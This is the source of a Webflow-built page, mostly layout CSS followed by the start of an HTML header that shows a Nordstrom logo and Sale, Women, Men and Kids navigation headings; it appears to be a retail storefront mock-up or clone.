.w-lightbox-image{max-width:82.3vw;max-height:84vh}.w-lightbox-left,.w-lightbox-right{display:block;opacity:.5}.w-lightbox-close{opacity:.8}.w-lightbox-control:hover{opacity:1}}.w-lightbox-inactive,.w-lightbox-inactive:hover{opacity:0}.w-richtext:before,.w-richtext:after{content:" ";display:table;grid-column-start:1;grid-row-start:1;grid-column-end:2;grid-row-end:2}.w-richtext:after{clear:both}.w-richtext[contenteditable="true"]:before,.w-richtext[contenteditable="true"]:after{white-space:initial}.w-richtext ol,.w-richtext ul{overflow:hidden}.w-richtext .w-richtext-figure-selected.w-richtext-figure-type-video div:after,.w-richtext .w-richtext-figure-selected[data-rt-type="video"] div:after{outline:2px solid #2895f7}.w-richtext .w-richtext-figure-selected.w-richtext-figure-type-image div,.w-richtext .w-richtext-figure-selected[data-rt-type="image"] div{outline:2px solid #2895f7}.w-richtext figure.w-richtext-figure-type-video>div:after,.w-richtext figure[data-rt-type="video"]>div:after{content:'';position:absolute;display:none;left:0;top:0;right:0;bottom:0}.w-richtext figure{position:relative;max-width:60%}.w-richtext figure>div:before{cursor:default !important}.w-richtext figure img{width:100%}.w-richtext figure figcaption.w-richtext-figcaption-placeholder{opacity:.6}.w-richtext figure div{font-size:0;color:transparent}.w-richtext figure.w-richtext-figure-type-image,.w-richtext figure[data-rt-type="image"]{display:table}.w-richtext figure.w-richtext-figure-type-image>div,.w-richtext figure[data-rt-type="image"]>div{display:inline-block}.w-richtext figure.w-richtext-figure-type-image>figcaption,.w-richtext figure[data-rt-type="image"]>figcaption{display:table-caption;caption-side:bottom}.w-richtext figure.w-richtext-figure-type-video,.w-richtext figure[data-rt-type="video"]{width:60%;height:0}.w-richtext figure.w-richtext-figure-type-video iframe,.w-richtext figure[data-rt-type="video"] iframe{position:absolute;top:0;left:0;width:100%;height:100%}.w-richtext figure.w-richtext-figure-type-video>div,.w-richtext figure[data-rt-type="video"]>div{width:100%}.w-richtext figure.w-richtext-align-center{margin-right:auto;margin-left:auto;clear:both}.w-richtext figure.w-richtext-align-center.w-richtext-figure-type-image>div,.w-richtext figure.w-richtext-align-center[data-rt-type="image"]>div{max-width:100%}.w-richtext figure.w-richtext-align-normal{clear:both}.w-richtext figure.w-richtext-align-fullwidth{width:100%;max-width:100%;text-align:center;clear:both;display:block;margin-right:auto;margin-left:auto}.w-richtext figure.w-richtext-align-fullwidth>div{display:inline-block;padding-bottom:inherit}.w-richtext figure.w-richtext-align-fullwidth>figcaption{display:block}.w-richtext figure.w-richtext-align-floatleft{float:left;margin-right:15px;clear:none}.w-richtext figure.w-richtext-align-floatright{float:right;margin-left:15px;clear:none}.w-nav{position:relative;background:#dddddd;z-index:1000}.w-nav:before,.w-nav:after{content:" ";display:table;grid-column-start:1;grid-row-start:1;grid-column-end:2;grid-row-end:2}.w-nav:after{clear:both}.w-nav-brand{position:relative;float:left;text-decoration:none;color:#333333}.w-nav-link{position:relative;display:inline-block;vertical-align:top;text-decoration:none;color:#222222;padding:20px;text-align:left;margin-left:auto;margin-right:auto}.w-nav-link.w--current{color:#0082f3}.w-nav-menu{position:relative;float:right}[data-nav-menu-open]{display:block !important;position:absolute;top:100%;left:0;right:0;background:#C8C8C8;text-align:center;overflow:visible;min-width:200px}.w--nav-link-open{display:block;position:relative}.w-nav-overlay{position:absolute;overflow:hidden;display:none;top:100%;left:0;right:0;width:100%}.w-nav-overlay [data-nav-menu-open]{top:0}.w-nav[data-animation="over-left"] .w-nav-overlay{width:auto}.w-nav[data-animation="over-left"] .w-nav-overlay,.w-nav[data-animation="over-left"] [data-nav-menu-open]{right:auto;z-index:1;top:0}.w-nav[data-animation="over-right"] .w-nav-overlay{width:auto}.w-nav[data-animation="over-right"] .w-nav-overlay,.w-nav[data-animation="over-right"] [data-nav-menu-open]{left:auto;z-index:1;top:0}.w-nav-button{position:relative;float:right;padding:18px;font-size:24px;display:none;cursor:pointer;-webkit-tap-highlight-color:rgba(0,0,0,0);tap-highlight-color:rgba(0,0,0,0);-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.w-nav-button:focus{outline:0}.w-nav-button.w--open{background-color:#C8C8C8;color:white}.w-nav[data-collapse="all"] .w-nav-menu{display:none}.w-nav[data-collapse="all"] .w-nav-button{display:block}.w--nav-dropdown-open{display:block}.w--nav-dropdown-toggle-open{display:block}.w--nav-dropdown-list-open{position:static}@media screen and (max-width:991px){.w-nav[data-collapse="medium"] .w-nav-menu{display:none}.w-nav[data-collapse="medium"] .w-nav-button{display:block}}@media screen and (max-width:767px){.w-nav[data-collapse="small"] .w-nav-menu{display:none}.w-nav[data-collapse="small"] .w-nav-button{display:block}.w-nav-brand{padding-left:10px}}@media screen and (max-width:479px){.w-nav[data-collapse="tiny"] .w-nav-menu{display:none}.w-nav[data-collapse="tiny"] .w-nav-button{display:block}}.w-tabs{position:relative}.w-tabs:before,.w-tabs:after{content:" ";display:table;grid-column-start:1;grid-row-start:1;grid-column-end:2;grid-row-end:2}.w-tabs:after{clear:both}.w-tab-menu{position:relative}.w-tab-link{position:relative;display:inline-block;vertical-align:top;text-decoration:none;padding:9px 30px;text-align:left;cursor:pointer;color:#222222;background-color:#dddddd}.w-tab-link.w--current{background-color:#C8C8C8}.w-tab-link:focus{outline:0}.w-tab-content{position:relative;display:block;overflow:hidden}.w-tab-pane{position:relative;display:none}.w--tab-active{display:block}@media screen and (max-width:479px){.w-tab-link{display:block}}.w-ix-emptyfix:after{content:""}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}.w-dyn-empty{padding:10px;background-color:#dddddd}.w-dyn-hide{display:none !important}.w-dyn-bind-empty{display:none !important}.w-condition-invisible{display:none !important}

   /* ==========================================================================
      Start of custom Webflow CSS
      ========================================================================== */
   .w-layout-grid {
     display: -ms-grid;
     display: grid;
     grid-auto-columns: 1fr;
     -ms-grid-columns: 1fr 1fr;
     grid-template-columns: 1fr 1fr;
     -ms-grid-rows: auto auto;
     grid-template-rows: auto auto;
     grid-row-gap: 16px;
     grid-column-gap: 16px;
   }
   
   .grid {
     margin-top: 16px;
     padding-left: 20px;
     -ms-grid-columns: 1fr 1fr 1fr;
     grid-template-columns: 1fr 1fr 1fr;
     -ms-grid-rows: auto;
     grid-template-rows: auto;
   }
   
   .image {
     width: 200px;
   }
   
   .grid-2 {
     padding-left: 24px;
     justify-items: start;
     -ms-grid-columns: 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr;
     grid-template-columns: 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr;
     -ms-grid-rows: auto;
     grid-template-rows: auto;
   }
   
   .heading {
     font-size: 14px;
     font-weight: 400;
   }
   
   .heading-2 {
     display: -webkit-box;
     display: -webkit-flex;
     display: -ms-flexbox;
     display: flex;
     -webkit-box-pack: center;
     -webkit-justify-content: center;
     -ms-flex-pack: center;
     justify-content: center;
     font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
     font-size: 25px;
     font-weight: 400;
   }
   
   .div-block {
     display: -webkit-box;
     display: -webkit-flex;
     display: -ms-flexbox;
     display: flex;
     width: 525px;
     height: 500px;
     -webkit-box-pack: end;
     -webkit-justify-content: flex-end;
     -ms-flex-pack: end;
     justify-content: flex-end;
     -webkit-box-align: center;
     -webkit-align-items: center;
     -ms-flex-align: center;
     align-items: center;
   }
   
   .body {
     display: block;
     -webkit-box-orient: vertical;
     -webkit-box-direction: normal;
     -webkit-flex-direction: column;
     -ms-flex-direction: column;
     flex-direction: column;
     -webkit-box-pack: justify;
     -webkit-justify-content: space-between;
     -ms-flex-pack: justify;
     justify-content: space-between;
     -webkit-box-align: end;
     -webkit-align-items: flex-end;
     -ms-flex-align: end;
     align-items: flex-end;
   }
   
   .div-block-2 {
     display: -webkit-box;
     display: -webkit-flex;
     display: -ms-flexbox;
     display: flex;
     width: 500px;
     height: 500px;
     -webkit-box-pack: justify;
     -webkit-justify-content: space-between;
     -ms-flex-pack: justify;
     justify-content: space-between;
   }
   
   .section {
     display: -webkit-box;
     display: -webkit-flex;
     display: -ms-flexbox;
     display: flex;
     height: 500px;
     margin-right: 10px;
     margin-left: 10px;
     -webkit-box-pack: center;
     -webkit-justify-content: center;
     -ms-flex-pack: center;
     justify-content: center;
   }
   
   .div-block-3 {
     display: -webkit-box;
     display: -webkit-flex;
     display: -ms-flexbox;
     display: flex;
     width: 500px;
     height: 300px;
     padding-top: 33px;
     -webkit-box-orient: vertical;
     -webkit-box-direction: normal;
     -webkit-flex-direction: column;
     -ms-flex-direction: column;
     flex-direction: column;
     -webkit-box-pack: start;
     -webkit-justify-content: flex-start;
     -ms-flex-pack: start;
     justify-content: flex-start;
     -webkit-box-align: center;
     -webkit-align-items: center;
     -ms-flex-align: center;
     align-items: center;
     text-align: justify;
   }
   
   .heading-3 {
     position: relative;
     left: -17px;
     display: -webkit-box;
     display: -webkit-flex;
     display: -ms-flexbox;
     display: flex;
     -webkit-box-pack: start;
     -webkit-justify-content: flex-start;
     -ms-flex-pack: start;
     justify-content: flex-start;
     font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
     color: #000;
     font-size: 27px;
     font-weight: 400;
   }
   
   .paragraph {
     position: relative;
     left: -8px;
     display: -webkit-box;
     display: -webkit-flex;
     display: -ms-flexbox;
     display: flex;
     width: 300px;
     padding-left: 0px;
     -webkit-box-pack: start;
     -webkit-justify-content: flex-start;
     -ms-flex-pack: start;
     justify-content: flex-start;
   }
   
   .form {
     width: 375px;
     height: 240px;
     margin-right: 16px;
     padding-right: 0px;
   }
   
   .form-block {
     display: -webkit-box;
     display: -webkit-flex;
     display: -ms-flexbox;
     display: flex;
     margin-left: 81px;
     padding-left: 0px;
     -webkit-box-pack: end;
     -webkit-justify-content: flex-end;
     -ms-flex-pack: end;
     justify-content: flex-end;
   }
   
   .submit-button {
     position: relative;
     bottom: -8px;
     width: 375px;
     background-color: #000;
   }
   
   .paragraph-2 {
     color: #000;
     font-size: 13px;
   }
   
   .paragraph-3 {
     color: #050505;
   }
   
   .section-2 {
     height: 500px;
     background-color: #fdfcfc;
   }
   
   .grid-3 {
     -ms-grid-columns: 1fr 1fr 1fr 1fr 1fr 1fr;
     grid-template-columns: 1fr 1fr 1fr 1fr 1fr 1fr;
     -ms-grid-rows: auto;
     grid-template-rows: auto;
   }
   
   .heading-4 {
     font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
   }
   
   .heading-5 {
     font-family: Ubuntu, Helvetica, sans-serif;
   }
   
   .grid-4 {
     -ms-grid-columns: 1fr 1fr 1fr 1fr 1fr 1fr;
     grid-template-columns: 1fr 1fr 1fr 1fr 1fr 1fr;
     -ms-grid-rows: auto;
     grid-template-rows: auto;
   }
   
   .div-block-4 {
     width: 350px;
     margin-top: 44px;
     margin-right: 10px;
     margin-left: 10px;
     padding-top: 0px;
   }
   
   .heading-6 {
     font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
     font-size: 30px;
     font-weight: 400;
     text-align: left;
   }
   
   .field-label {
     margin-top: 13px;
     margin-bottom: 0px;
   }
   
   .submit-button-2 {
     width: 100%;
     height: 45px;
     margin-top: 10px;
     background-color: #000;
   }
   
   .grid-5 {
     grid-column-gap: 0px;
     -ms-grid-columns: 1fr 1fr 1fr 1.25fr 1fr 1fr;
     grid-template-columns: 1fr 1fr 1fr 1.25fr 1fr 1fr;
     -ms-grid-rows: auto;
     grid-template-rows: auto;
   }
   
   .heading-7 {
     font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
     font-size: 14px;
   }
   
   .paragraph-6 {
     font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
     font-size: 13px;
   }
   
   .image-2 {
     display: none;
   }
   
   .image-3 {
     display: none;
   }
   
   .image-4 {
     display: none;
   }
   
   .text-field-2 {
     height: 45px;
   }
   
   @media screen and (max-width: 767px) {
     .grid {
       justify-items: end;
       grid-auto-flow: row;
       grid-column-gap: 0px;
       grid-row-gap: 0px;
       -ms-grid-columns: 1.5fr 1.75fr 5.75fr 0.75fr;
       grid-template-columns: 1.5fr 1.75fr 5.75fr 0.75fr;
     }
   
     .grid-2 {
       display: none;
     }
   
     .section-2 {
       display: none;
     }
   
     .grid-4 {
       display: none;
     }
   
     .div-block-4 {
       margin-top: 8px;
       padding-top: 0px;
     }
   
     .image-2 {
       display: block;
     }
   
     .image-3 {
       display: block;
     }
   
     .image-4 {
       display: block;
     }
   }
   
   @media screen and (max-width: 479px) {
     .grid {
       padding-left: 0px;
       -webkit-box-pack: justify;
       -webkit-justify-content: space-between;
       -ms-flex-pack: justify;
       justify-content: space-between;
       justify-items: end;
       -webkit-align-content: space-around;
       -ms-flex-line-pack: distribute;
       align-content: space-around;
       grid-column-gap: 0px;
       -ms-grid-columns: 1fr 1.25fr 5.5fr 1fr;
       grid-template-columns: 1fr 1.25fr 5.5fr 1fr;
     }
   
     .image {
       width: 125px;
       max-width: none;
       min-width: auto;
       padding-left: 10px;
     }
   
     .grid-2 {
       display: none;
     }
   
     .body {
       display: -webkit-box;
       display: -webkit-flex;
       display: -ms-flexbox;
       display: flex;
       height: 475px;
       padding-left: 0px;
       -webkit-box-align: center;
       -webkit-align-items: center;
       -ms-flex-align: center;
       align-items: center;
     }
   
     .section {
       display: -webkit-box;
       display: -webkit-flex;
       display: -ms-flexbox;
       display: flex;
       width: 100%;
       height: 400px;
       margin-left: 10px;
       padding-left: 0px;
       -webkit-box-pack: center;
       -webkit-justify-content: center;
       -ms-flex-pack: center;
       justify-content: center;
       -webkit-box-align: start;
       -webkit-align-items: flex-start;
       -ms-flex-align: start;
       align-items: flex-start;
       -webkit-box-flex: 1;
       -webkit-flex: 1;
       -ms-flex: 1;
       flex: 1;
     }
   
     .div-block-3 {
       position: relative;
       left: -59px;
       bottom: 118px;
       width: 100%;
       padding-top: 0px;
       padding-right: 0px;
       -webkit-box-pack: justify;
       -webkit-justify-content: space-between;
       -ms-flex-pack: justify;
       justify-content: space-between;
       -webkit-box-align: center;
       -webkit-align-items: center;
       -ms-flex-align: center;
       align-items: center;
     }
   
     .heading-3 {
       left: -4px;
       width: 310px;
       height: 30px;
     }
   
     .paragraph {
       left: 0px;
       margin-left: -6px;
     }
   
     .form {
       position: relative;
       left: -22px;
       display: -webkit-box;
       display: -webkit-flex;
       display: -ms-flexbox;
       display: flex;
       width: 350px;
       margin-right: 0px;
       -webkit-box-orient: vertical;
       -webkit-box-direction: normal;
       -webkit-flex-direction: column;
       -ms-flex-direction: column;
       flex-direction: column;
       -webkit-box-pack: start;
       -webkit-justify-content: flex-start;
       -ms-flex-pack: start;
       justify-content: flex-start;
       -webkit-box-align: start;
       -webkit-align-items: flex-start;
       -ms-flex-align: start;
       align-items: flex-start;
     }
   
     .submit-button {
       width: 350px;
     }
   
     .paragraph-3 {
       width: 350px;
       font-size: 13px;
     }
   
     .section-2 {
       display: none;
     }
   
     .grid-4 {
       display: none;
     }
   
     .text-field {
       width: 350px;
     }
   
     .div-block-4 {
       display: block;
       width: 445px;
       margin-top: 25px;
       margin-right: 10px;
       margin-left: 10px;
       padding-right: 5px;
       padding-left: 5px;
       -webkit-box-orient: vertical;
       -webkit-box-direction: normal;
       -webkit-flex-direction: column;
       -ms-flex-direction: column;
       flex-direction: column;
       -webkit-box-pack: start;
       -webkit-justify-content: flex-start;
       -ms-flex-pack: start;
       justify-content: flex-start;
     }
   
     .heading-6 {
       width: 350px;
       color: #333;
       font-size: 24px;
     }
   
     .field-label {
       margin-top: 16px;
     }
   
     .submit-button-2 {
       width: 100%;
       height: 50px;
       font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
     }
   
     .section-3 {
       display: none;
       -webkit-box-pack: justify;
       -webkit-justify-content: space-between;
       -ms-flex-pack: justify;
       justify-content: space-between;
       -webkit-box-align: end;
       -webkit-align-items: flex-end;
       -ms-flex-align: end;
       align-items: flex-end;
     }
   
     .section-4 {
       display: -webkit-box;
       display: -webkit-flex;
       display: -ms-flexbox;
       display: flex;
       width: 385px;
       margin-right: 10px;
       margin-left: 10px;
       -webkit-box-pack: justify;
       -webkit-justify-content: space-between;
       -ms-flex-pack: justify;
       justify-content: space-between;
       -webkit-box-flex: 0;
       -webkit-flex: 0 auto;
       -ms-flex: 0 auto;
       flex: 0 auto;
       grid-auto-columns: 1fr;
       -ms-grid-columns: 1fr 1fr;
       grid-template-columns: 1fr 1fr;
       -ms-grid-rows: auto auto;
       grid-template-rows: auto auto;
     }
   
     .paragraph-4 {
       font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
     }
   
     .paragraph-5 {
       margin-top: 15px;
       padding-top: 0px;
       font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
       color: #000;
       font-size: 14px;
     }
   
     .image-2 {
       width: 30px;
       padding-top: 2px;
     }
   
     .text-field-2 {
       height: 50px;
       margin-top: 3px;
       border-radius: 0px;
     }
   
     .text-span {
       font-style: normal;
       text-decoration: underline;
     }
   }
   
   #w-node-_77f1a843-fcbd-6f2e-3a9b-510cf20e7465-fa5d8923 {
     -ms-grid-column: span 1;
     grid-column-start: span 1;
     -ms-grid-column-span: 1;
     grid-column-end: span 1;
     -ms-grid-row: span 1;
     grid-row-start: span 1;
     -ms-grid-row-span: 1;
     grid-row-end: span 1;
   }
   
   #w-node-ea9723e3-2f4c-8fa4-e15e-38fb4c501f18-fa5d8923 {
     -ms-grid-column: span 1;
     grid-column-start: span 1;
     -ms-grid-column-span: 1;
     grid-column-end: span 1;
     -ms-grid-row: span 1;
     grid-row-start: span 1;
     -ms-grid-row-span: 1;
     grid-row-end: span 1;
   }
   
   #w-node-_6a5aed10-7264-99f6-8175-aef5ad9c9b68-fa5d8923 {
     -ms-grid-column: span 1;
     grid-column-start: span 1;
     -ms-grid-column-span: 1;
     grid-column-end: span 1;
     -ms-grid-row: span 1;
     grid-row-start: span 1;
     -ms-grid-row-span: 1;
     grid-row-end: span 1;
   }
   
   #w-node-_9ac46cf3-3551-f2b7-173d-4909fa218f04-fa5d8923 {
     -ms-grid-column: span 1;
     grid-column-start: span 1;
     -ms-grid-column-span: 1;
     grid-column-end: span 1;
     -ms-grid-row: span 1;
     grid-row-start: span 1;
     -ms-grid-row-span: 1;
     grid-row-end: span 1;
   }
   
   #w-node-ec4c8ddd-2267-4d5a-0d91-1dcde368d72a-fa5d8923 {
     -ms-grid-column: span 1;
     grid-column-start: span 1;
     -ms-grid-column-span: 1;
     grid-column-end: span 1;
     -ms-grid-row: span 1;
     grid-row-start: span 1;
     -ms-grid-row-span: 1;
     grid-row-end: span 1;
   }
   
   #w-node-b89b868b-e119-3e3b-15fb-6bcb22cc2be8-fa5d8923 {
     -ms-grid-column: span 1;
     grid-column-start: span 1;
     -ms-grid-column-span: 1;
     grid-column-end: span 1;
     -ms-grid-row: span 1;
     grid-row-start: span 1;
     -ms-grid-row-span: 1;
     grid-row-end: span 1;
   }
   
   #w-node-_217d3948-9384-c2a7-b710-0ffbc890ad23-fa5d8923 {
     -ms-grid-column: span 1;
     grid-column-start: span 1;
     -ms-grid-column-span: 1;
     grid-column-end: span 1;
     -ms-grid-row: span 1;
     grid-row-start: span 1;
     -ms-grid-row-span: 1;
     grid-row-end: span 1;
   }
   
   #w-node-b76920da-48e5-89be-d4c4-529269a56802-fa5d8923 {
     -ms-grid-column: span 1;
     grid-column-start: span 1;
     -ms-grid-column-span: 1;
     grid-column-end: span 1;
     -ms-grid-row: span 1;
     grid-row-start: span 1;
     -ms-grid-row-span: 1;
     grid-row-end: span 1;
   }
   
   #w-node-_0bcb5043-5d75-2662-7454-39d422392e7c-fa5d8923 {
     -ms-grid-column: span 1;
     grid-column-start: span 1;
     -ms-grid-column-span: 1;
     grid-column-end: span 1;
     -ms-grid-row: span 1;
     grid-row-start: span 1;
     -ms-grid-row-span: 1;
     grid-row-end: span 1;
   }
   
   #w-node-_785eae4e-ea68-e0af-a7a4-adb0d5362eaa-fa5d8923 {
     -ms-grid-column: span 1;
     grid-column-start: span 1;
     -ms-grid-column-span: 1;
     grid-column-end: span 1;
     -ms-grid-row: span 1;
     grid-row-start: span 1;
     -ms-grid-row-span: 1;
     grid-row-end: span 1;
   }
   
   #w-node-_4c89e29a-a674-8a5d-b626-040ad40973dd-fa5d8923 {
     -ms-grid-column: span 1;
     grid-column-start: span 1;
     -ms-grid-column-span: 1;
     grid-column-end: span 1;
     -ms-grid-row: span 1;
     grid-row-start: span 1;
     -ms-grid-row-span: 1;
     grid-row-end: span 1;
   }
   
   #w-node-_4a65f823-eb01-e5d3-5266-3e0dc36e638e-fa5d8923 {
     -ms-grid-column: span 1;
     grid-column-start: span 1;
     -ms-grid-column-span: 1;
     grid-column-end: span 1;
     -ms-grid-row: span 1;
     grid-row-start: span 1;
     -ms-grid-row-span: 1;
     grid-row-end: span 1;
   }
   
   #w-node-df6848cb-2d08-e212-19a8-b8fc65ee3646-fa5d8923 {
     -ms-grid-column: span 1;
     grid-column-start: span 1;
     -ms-grid-column-span: 1;
     grid-column-end: span 1;
     -ms-grid-row: span 1;
     grid-row-start: span 1;
     -ms-grid-row-span: 1;
     grid-row-end: span 1;
   }
   
   #w-node-_32eac848-92b6-b597-0171-2437483a1707-fa5d8923 {
     -ms-grid-column: span 1;
     grid-column-start: span 1;
     -ms-grid-column-span: 1;
     grid-column-end: span 1;
     -ms-grid-row: span 1;
     grid-row-start: span 1;
     -ms-grid-row-span: 1;
     grid-row-end: span 1;
   }
   
   #w-node-f1bdbf18-9a2d-420e-8b2c-55ab1cff6559-fa5d8923 {
     -ms-grid-column: span 1;
     grid-column-start: span 1;
     -ms-grid-column-span: 1;
     grid-column-end: span 1;
     -ms-grid-row: span 1;
     grid-row-start: span 1;
     -ms-grid-row-span: 1;
     grid-row-end: span 1;
   }
   
   #w-node-_37776afc-f7b6-74ef-e4de-732c0a7ae14a-fa5d8923 {
     -ms-grid-column: span 1;
     grid-column-start: span 1;
     -ms-grid-column-span: 1;
     grid-column-end: span 1;
     -ms-grid-row: span 1;
     grid-row-start: span 1;
     -ms-grid-row-span: 1;
     grid-row-end: span 1;
   }
   
   #w-node-_37776afc-f7b6-74ef-e4de-732c0a7ae14d-fa5d8923 {
     -ms-grid-column: span 1;
     grid-column-start: span 1;
     -ms-grid-column-span: 1;
     grid-column-end: span 1;
     -ms-grid-row: span 1;
     grid-row-start: span 1;
     -ms-grid-row-span: 1;
     grid-row-end: span 1;
   }
   
   #w-node-_23640631-27f3-f220-60e1-2a60666dd642-fa5d8923 {
     -ms-grid-column: span 1;
     grid-column-start: span 1;
     -ms-grid-column-span: 1;
     grid-column-end: span 1;
     -ms-grid-row: span 1;
     grid-row-start: span 1;
     -ms-grid-row-span: 1;
     grid-row-end: span 1;
   }
   
   #w-node-_23640631-27f3-f220-60e1-2a60666dd645-fa5d8923 {
     -ms-grid-column: span 1;
     grid-column-start: span 1;
     -ms-grid-column-span: 1;
     grid-column-end: span 1;
     -ms-grid-row: span 1;
     grid-row-start: span 1;
     -ms-grid-row-span: 1;
     grid-row-end: span 1;
   }
   
   #w-node-_05ba05ca-fd64-0255-2e87-b58bfaafe9a7-fa5d8923 {
     -ms-grid-column: span 1;
     grid-column-start: span 1;
     -ms-grid-column-span: 1;
     grid-column-end: span 1;
     -ms-grid-row: span 1;
     grid-row-start: span 1;
     -ms-grid-row-span: 1;
     grid-row-end: span 1;
   }
   
   #w-node-_05ba05ca-fd64-0255-2e87-b58bfaafe9aa-fa5d8923 {
     -ms-grid-column: span 1;
     grid-column-start: span 1;
     -ms-grid-column-span: 1;
     grid-column-end: span 1;
     -ms-grid-row: span 1;
     grid-row-start: span 1;
     -ms-grid-row-span: 1;
     grid-row-end: span 1;
   }
   
   #w-node-_98775702-3129-0a44-fed3-b7cca2604caf-fa5d8923 {
     -ms-grid-column: span 1;
     grid-column-start: span 1;
     -ms-grid-column-span: 1;
     grid-column-end: span 1;
     -ms-grid-row: span 1;
     grid-row-start: span 1;
     -ms-grid-row-span: 1;
     grid-row-end: span 1;
   }
   
   #w-node-_0ad3eac4-ba87-4d20-f81f-8f1cb11718b9-fa5d8923 {
     -ms-grid-column: span 1;
     grid-column-start: span 1;
     -ms-grid-column-span: 1;
     grid-column-end: span 1;
     -ms-grid-row: span 1;
     grid-row-start: span 1;
     -ms-grid-row-span: 1;
     grid-row-end: span 1;
   }
   
   #w-node-_0ad3eac4-ba87-4d20-f81f-8f1cb11718bc-fa5d8923 {
     -ms-grid-column: span 1;
     grid-column-start: span 1;
     -ms-grid-column-span: 1;
     grid-column-end: span 1;
     -ms-grid-row: span 1;
     grid-row-start: span 1;
     -ms-grid-row-span: 1;
     grid-row-end: span 1;
   }
   
   @media screen and (max-width: 767px) {
     #w-node-ea9723e3-2f4c-8fa4-e15e-38fb4c501f18-fa5d8923 {
       -ms-grid-column-align: auto;
       justify-self: auto;
     }
   }
   
   @media screen and (max-width: 479px) {
     #w-node-_7f899348-9707-8455-6f5b-36f3ffef4ab5-fa5d8923 {
       -ms-grid-column: span 1;
       grid-column-start: span 1;
       -ms-grid-column-span: 1;
       grid-column-end: span 1;
       -ms-grid-row: span 1;
       grid-row-start: span 1;
       -ms-grid-row-span: 1;
       grid-row-end: span 1;
     }
   
     #w-node-_62a9363d-5d76-357d-dba4-854cdfc316cf-fa5d8923 {
       -ms-grid-column: span 1;
       grid-column-start: span 1;
       -ms-grid-column-span: 1;
       grid-column-end: span 1;
       -ms-grid-row: span 1;
       grid-row-start: span 1;
       -ms-grid-row-span: 1;
       grid-row-end: span 1;
     }
   }
   @font-face {
     font-family: 'Hvd fonts brandontext';
     src: url('https://uploads-ssl.webflow.com/6206b905713e806d865d8920/6206bd678e07d4250671d77e_HVD%20Fonts%20-%20BrandonText-Regular.otf') format('opentype');
     font-weight: 400;
     font-style: normal;
     font-display: swap;
   }
   
   </style>
   
   </head>
   <body class="body">
      <div data-wf-quick-add-section="nav" class="section-4 wf-section">
         <div class="w-layout-grid grid"><img src="https://uploads-ssl.webflow.com/6206b905713e806d865d8920/6206db1a226a9828a5d47d0c_menu.png" loading="lazy" width="50" id="w-node-_7f899348-9707-8455-6f5b-36f3ffef4ab5-fa5d8923" alt="" class="image-2"/><img src="https://uploads-ssl.webflow.com/6206b905713e806d865d8920/6206b99b9c55a51c51f037d7_Nordstrom_Logo_2019.png" loading="lazy" id="w-node-_77f1a843-fcbd-6f2e-3a9b-510cf20e7465-fa5d8923" sizes="(max-width: 479px) 125px, 200px" srcset="https://uploads-ssl.webflow.com/6206b905713e806d865d8920/6206b99b9c55a51c51f037d7_Nordstrom_Logo_2019-p-500.png 500w, https://uploads-ssl.webflow.com/6206b905713e806d865d8920/6206b99b9c55a51c51f037d7_Nordstrom_Logo_2019-p-800.png 800w, https://uploads-ssl.webflow.com/6206b905713e806d865d8920/6206b99b9c55a51c51f037d7_Nordstrom_Logo_2019-p-1080.png 1080w, https://uploads-ssl.webflow.com/6206b905713e806d865d8920/6206b99b9c55a51c51f037d7_Nordstrom_Logo_2019.png 1348w" alt="" class="image"/><img src="https://uploads-ssl.webflow.com/6206b905713e806d865d8920/6206db1a86df058b1a7b2484_661-6617942_.png" loading="lazy" width="15" id="w-node-ea9723e3-2f4c-8fa4-e15e-38fb4c501f18-fa5d8923" srcset="https://uploads-ssl.webflow.com/6206b905713e806d865d8920/6206db1a86df058b1a7b2484_661-6617942_-p-500.png 500w, https://uploads-ssl.webflow.com/6206b905713e806d865d8920/6206db1a86df058b1a7b2484_661-6617942_-p-800.png 800w, https://uploads-ssl.webflow.com/6206b905713e806d865d8920/6206db1a86df058b1a7b2484_661-6617942_.png 860w" sizes="(max-width: 767px) 15px, 100vw" alt="" class="image-4"/><img src="https://uploads-ssl.webflow.com/6206b905713e806d865d8920/6206dfbca24440003cd7c442_images1.png" loading="lazy" width="20" id="w-node-_62a9363d-5d76-357d-dba4-854cdfc316cf-fa5d8923" alt="" class="image-3"/></div>
      </div>
      <div data-wf-quick-add-section="body" class="section-3 wf-section">
         <div>
            <div class="w-layout-grid grid-2">
               <h5 id="w-node-_6a5aed10-7264-99f6-8175-aef5ad9c9b68-fa5d8923" class="heading">Sale</h5>
               <h5 id="w-node-_9ac46cf3-3551-f2b7-173d-4909fa218f04-fa5d8923" class="heading">Women</h5>
               <h5 id="w-node-ec4c8ddd-2267-4d5a-0d91-1dcde368d72a-fa5d8923" class="heading">Men</h5>
               <h5 id="w-node-b89b868b-e119-3e3b-15fb-6bcb22cc2be8-fa5d8923" class="heading">Kids</h5>
